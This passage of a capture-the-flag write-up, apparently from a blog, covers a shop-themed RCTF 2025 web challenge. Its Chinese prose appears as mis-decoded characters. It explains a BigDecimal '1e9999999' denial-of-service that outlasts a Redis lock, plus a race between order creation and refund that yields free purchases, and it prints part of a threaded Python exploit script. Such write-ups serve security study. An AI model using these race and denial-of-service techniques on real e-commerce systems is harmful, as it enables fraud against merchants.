punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>xiaotudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"little potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>diguaId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"sweet potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>yuId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"fish needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>purchasedProductIds<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>datudouId<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"large potato needed~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getBalance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"10.00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"your balance is lower than 10~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Coupon</span><span class="token punctuation">></span></span> userCoupons <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>couponService<span class="token punctuation">.</span><span class="token function">getUserCoupons</span><span class="token punctuation">(</span>userId<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">boolean</span> hasUnusedCoupon <span class="token operator">=</span> userCoupons<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span><span class="token punctuation">(</span>coupon<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token operator">!</span>coupon<span class="token punctuation">.</span><span class="token function">getIsUsed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hasUnusedCoupon<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"you cannot use your coupon~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">success</span><span class="token punctuation">(</span><span class="token string">"Ultimate Freeloader! ï¼"</span><span class="token punctuation">,</span> <span class="token string">"RCTF&#123;test_flag&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token class-name">Result</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"internal error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ç”¨æˆ·å·²è®¤è¯ï¼ˆæœ‰æ•ˆçš„JWT tokenï¼‰</li><li>è´­ä¹°å¹¶å®Œæˆï¼ˆçŠ¶æ€ä¸º COMPLETEDï¼‰ä»¥ä¸‹4ä¸ªå•†å“ï¼š<ul><li>Little Potatoï¼ˆå°åœŸè±†ï¼‰- 5.50</li><li>Sweet Potatoï¼ˆåœ°ç“œï¼‰- 8.80</li><li>Fish Fishï¼ˆé±¼ï¼‰- 4.20</li><li>Large Potatoï¼ˆå¤§åœŸè±†ï¼‰- 10.00</li></ul></li><li>ç”¨æˆ·ä½™é¢å¿…é¡»ç­‰äº 10.00ï¼ˆä¸èƒ½ä½äº10ï¼‰</li><li>ç”¨æˆ·å¿…é¡»æœ‰ä¸€ä¸ªæœªä½¿ç”¨çš„ä¼˜æƒ åˆ¸</li></ul><p>ç›®æ ‡æ˜¯é›¶å…ƒè´­ï¼Œæ€è·¯ä¸Šå¾€æ¡ä»¶ç«äº‰é </p><h2 id="è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„-dos-ç«äº‰-redis-é”é‡Šæ”¾"><a href="#è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„-dos-ç«äº‰-redis-é”é‡Šæ”¾" class="headerlink" title="è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„ dos ç«äº‰ redis é”é‡Šæ”¾"></a>è§£æ³•ä¸€ï¼šé«˜ç²¾åº¦è¿ç®—å¯¼è‡´çš„ dos ç«äº‰ redis é”é‡Šæ”¾</h2><p>OrderService::createOrder ä¸­å®ç°äº† redis é”</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> lockKey <span class="token operator">=</span> <span class="token string">"order:user:"</span> <span class="token operator">+</span> userId<span class="token punctuation">;</span><span class="token class-name">String</span> lockValue <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>redisLockUtil<span class="token punctuation">.</span><span class="token function">generateLockValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>redisLockUtil<span class="token punctuation">.</span><span class="token function">tryLock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> lockValue<span class="token punctuation">,</span> <span class="token number">3L</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token string">"System is busy, please try again later"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ä¸šåŠ¡é€»è¾‘</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>redisLockUtil<span class="token punctuation">.</span><span class="token function">unlock</span><span class="token punctuation">(</span>lockKey<span class="token punctuation">,</span> lockValue<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè®¾ç½®äº†é”å¯¼è‡´åŒä¸€ä¸ªç”¨æˆ·åœ¨åŒä¸€æ—¶é—´åªèƒ½å‘èµ·ä¸€ä¸ªåˆ›å»ºè®¢å•çš„è¯·æ±‚ï¼Œä½†æ˜¯è®¾ç½®äº†é”çš„è¶…æ—¶æ—¶é—´ä¸º 3 ç§’ï¼Œè¶…æ—¶ä¹‹åå°±ä¼šè§£é™¤é”ï¼Œä»è€Œå…è®¸ç»•è¿‡å¹¶å‘é™åˆ¶å‘èµ·ç¬¬äºŒä¸ªè¯·æ±‚</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªèƒ½è®©ä»£ç æ‰§è¡Œ 3 ç§’ä»¥ä¸Šçš„è€—æ—¶æ“ä½œï¼Œè¿™é‡Œéœ€è¦äº†è§£åˆ° <code>BigDecimal</code> ç±»çš„é—®é¢˜</p><blockquote><p>åœ¨äº¤æ˜“ç­‰æ¶‰åŠé«˜ç²¾åº¦æ•°å€¼è¿ç®—çš„åœºæ™¯ä¸‹å¸¸ç”¨åˆ° BigDecimal ç±»ï¼Œä½†æ˜¯ BigDecimal é«˜ç²¾åº¦çš„è¿ç®—çš„ä»£ä»·æ˜¯æé«˜çš„æ€§èƒ½æŸè€—ï¼Œåœ¨ Java ä¸­è‹¥ BigDecimal çš„å…¥å‚å¯æ§ï¼Œåˆ›å»ºçš„å¯¹è±¡è‹¥è¿›è¡ŒåŠ å‡ä¹˜é™¤ç­‰è¿ç®—åˆ™ä¼šæœ‰ Dos çš„é£é™©</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rois</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigDecimal</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">BigDecimal</span> num <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"1e9999999"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Long</span> startTime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BigDecimal</span> num1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span><span class="token string">"1111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BigDecimal</span> res <span class="token operator">=</span>  num<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>num1<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Long</span> endTime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>endTime <span class="token operator">-</span> startTime<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œä¼šäº§ç”Ÿå°†è¿‘ 4 ç§’çš„å»¶è¿Ÿ</p><p>è§‚å¯Ÿä¸šåŠ¡é€»è¾‘ä¸­æˆ‘ä»¬å¯æ§çš„ BigDecimal å€¼ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">BigDecimal</span> quantity <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigDecimal</span><span class="token punctuation">(</span>orderRequest<span class="token punctuation">.</span><span class="token function">getQuantity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260113015526489.png"></p><p>æ­¤å¤„ä½œä¸ºé£é™©ç‚¹ï¼Œåé¢æ˜¯ä½¿ç”¨ä¼˜æƒ åŠµçš„é€»è¾‘ï¼Œè€Œå‰é¢æ˜¯åˆ¤æ–­ä¼˜æƒ åŠµæ˜¯å¦å¯ç”¨çš„é€»è¾‘</p><p>å¦‚æœæˆ‘ä»¬çš„è®¢å•Aä¼ å…¥äº† quantity&#x3D;1e9999999 ä»¤ä»£ç å¡åœ¨è¿™ä¸€è¡Œï¼Œç­‰å¾… 3 ç§’å redis é”é‡Šæ”¾ï¼Œæ­¤æ—¶ dos è¿˜æœªç»“æŸï¼Œç”±äºæ­¤æ—¶è¿˜æ²¡æœ‰èµ°åˆ°æ›´æ–°ä¼˜æƒ åˆ¸çš„é€»è¾‘ä¼˜æƒ åˆ¸ä»ç„¶å¯ç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ›å»ºå¦ä¸€ä¸ªä½¿ç”¨ä¼˜æƒ åˆ¸çš„è®¢å• Bï¼Œç­‰å¾… dos ç»“æŸå update ä¼˜æƒ åˆ¸çš„çŠ¶æ€ä¸º falseï¼Œæ­¤æ—¶æˆ‘ä»¬å·²ç»æˆåŠŸåˆ›å»ºäº†ä¸¤ä¸ªä½¿ç”¨ä¼˜æƒ åˆ¸çš„è®¢å•ï¼Œé€€æ¬¾å…¶ä¸­ä»»æ„ä¸€ä¸ªè®¢å•å³å¯å°†ä½™é¢æ¢å¤å¦‚åˆå¹¶ä¸”æ¢å¤ä¼˜æƒ åˆ¸ä¸ºæœªä½¿ç”¨ï¼Œä»¥æ­¤æ¥å®ç°é›¶å…ƒè´­</p><p>ä¸å¥½ï¼Œæœ¬åœ°çš„æ€§èƒ½å¤ªå¥½äº†ï¼Œè¶…æ—¶åªæœ‰ 1 ç§’å¤šï¼ˆ</p><hr><h2 id="è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰"><a href="#è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰" class="headerlink" title="è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰"></a>è§£æ³•äºŒï¼šåˆ›å»ºè®¢å•ä¸æ’¤é”€è®¢å•ä¹‹é—´ç«äº‰</h2><p>å¯¹äºåˆ›å»ºè®¢å•çš„é”ï¼Œé”®ä¸º<code>&quot;order:user:&quot; + userId</code>ï¼Œå¯¹äºå–æ¶ˆè®¢å•çš„é”ï¼Œé”®ä¸º<code>&quot;refund:order:&quot; + orderId</code>ï¼Œé‚£ä¹ˆå³ä½¿åœ¨åˆ›å»º&#x2F;æ’¤é”€è®¢å•æ—¶æ— æ³•ç«äº‰ï¼Œä½†æ˜¯å´å­˜åœ¨åˆ›å»ºè®¢å•å’Œæ’¤é”€è®¢å•ä¹‹é—´çš„ç«äº‰</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260113021809344.png"></p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20260113021841223.png"></p><p>åˆ›å»ºè®¢å•ä¸é€€æ¬¾é”ä¸åŒï¼Œä½†æ˜¯åŒæ—¶å‘èµ·ç«äº‰æ—¶åˆæ€ userBalence æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤å­˜åœ¨ä»¥ä¸‹ç«äº‰å¯èƒ½ï¼š</p><p>å¦‚æœç”¨æˆ·å·²ç»ä½¿ç”¨ä¼˜æƒ åˆ¸ä¸‹å•å•†å“ï¼Œä½™é¢ä¸º10ï¼Œä½¿ç”¨ä¼˜æƒ åˆ¸</p><p>å»ºç«‹ä»¥ä¸‹ä¸¤ä¸ªçº¿ç¨‹ T1 å’Œ T2</p><table><thead><tr><th>åˆ›å»ºè®¢å•T1(ä¸ä½¿ç”¨ä¼˜æƒ åˆ¸)</th><th>æ’¤é”€è®¢å•T2</th></tr></thead><tbody><tr><td>è·å–ç”¨æˆ·ä½™é¢10ï¼ˆä¼˜æƒ åˆ¸ä¸å¯ç”¨ï¼‰</td><td></td></tr><tr><td></td><td>è·å–ç”¨æˆ·ä½™é¢10ï¼ˆä¼˜æƒ åˆ¸ä¸å¯ç”¨ï¼‰</td></tr><tr><td>ç”¨æˆ·ä½™é¢updateä¸ºæ‰£é™¤finalPriceåä½™é¢ï¼ˆä¼˜æƒ åˆ¸ä¸å¯ç”¨ï¼Œæœ€ç»ˆä½™é¢å°äº10ï¼‰</td><td></td></tr><tr><td></td><td>ç”¨æˆ·ä½™é¢updateä¸ºæ¢å¤finalPriceåä½™é¢ï¼ˆä¼˜æƒ åˆ¸å¯ç”¨ï¼Œä½™é¢æ¢å¤åˆ°10ï¼‰</td></tr></tbody></table><p>ä»è€Œå®ç°ä¸èŠ±é’±ä¸ä½¿ç”¨ä¼˜æƒ åˆ¸ä½†æ˜¯èƒ½å¤Ÿè´­å…¥å•†å“ï¼Œç›¸åŒçš„æ€è·¯åˆ†åˆ«å¯¹4ç§å•†å“è¿›è¡Œç«äº‰</p><p>è¿™é‡Œç›´æ¥æ”¾ SU çš„ exp äº†ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">from</span> decimal <span class="token keyword">import</span> Decimal<span class="token keyword">import</span> requestsBASE_URL <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:28086"</span><span class="token comment"># BASE_URL = "http://61.147.171.35:51469"</span>TARGET_PRODUCTS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Little Potato"</span><span class="token punctuation">,</span> <span class="token string">"Sweet Potato"</span><span class="token punctuation">,</span> <span class="token string">"Fish Fish"</span><span class="token punctuation">,</span> <span class="token string">"Large Potato"</span><span class="token punctuation">]</span>BASE_PRODUCT_NAME <span class="token operator">=</span> <span class="token string">"Little Potato"</span>SESSION <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">api_request</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> path<span class="token punctuation">,</span> token<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> BASE_URL <span class="token operator">+</span> path    headers <span class="token operator">=</span> kwargs<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"headers"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        headers<span class="token punctuation">[</span><span class="token string">"Authorization"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Bearer </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">if</span> <span class="token string">"json"</span> <span class="token keyword">in</span> kwargs <span class="token keyword">and</span> <span class="token string">"Content-Type"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> headers<span class="token punctuation">:</span>        headers<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"application/json"</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            resp <span class="token operator">=</span> SESSION<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>status_code<span class="token punctuation">,</span> <span class="token string">"raw"</span><span class="token punctuation">:</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"request failed"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">random_username</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"ctf"</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> random_username<span class="token punctuation">(</span><span class="token punctuation">)</span>        email <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">@example.com"</span></span>        body <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"Pass1234"</span><span class="token punctuation">,</span> <span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">&#125;</span>        data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> <span class="token string">"/api/user/register"</span><span class="token punctuation">,</span> json<span class="token operator">=</span>body<span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            d <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>            user <span class="token operator">=</span> d<span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Registered user </span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> user<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> d<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] register failed:"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_products</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/product/list"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    products <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>p<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">:</span> p<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> products<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">get_coupon_info</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/coupon/my"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    coupons <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span>    <span class="token keyword">assert</span> coupons    <span class="token keyword">return</span> coupons<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">get_user_balance</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/user/info"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    <span class="token keyword">return</span> Decimal<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_orders</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> api_request<span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"/api/order/my"</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    <span class="token keyword">assert</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">,</span> data    <span class="token keyword">return</span> data<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token 